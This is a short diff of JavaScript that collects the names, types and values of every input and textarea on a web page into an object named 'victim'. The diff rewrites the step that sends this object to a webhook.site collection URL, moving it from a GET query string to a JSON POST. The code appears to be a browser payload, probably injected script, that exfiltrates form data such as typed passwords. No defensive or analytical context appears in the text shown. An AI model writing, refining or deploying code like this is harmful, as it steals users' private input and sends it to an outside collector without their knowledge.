@@ -15,7 +15,12 @@
     inputs: Array.from(document.querySelectorAll('input,textarea')).map(i=>({name:i.name||i.id||'',type:i.type,value:i.value.substring(0,100)}))
   };
   
-  fetch('https://webhook.site/f3d30d6d-8d88-4fd8-8590-b70007607245?data='+encodeURIComponent(JSON.stringify(victim)))
+ fetch('https://webhook.site/f3d30d6d-8d88-4fd8-8590-b70007607245', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify(victim)
+})
+
     .then(()=>console.log('M.M.N'));
     
   // Visual confirmation
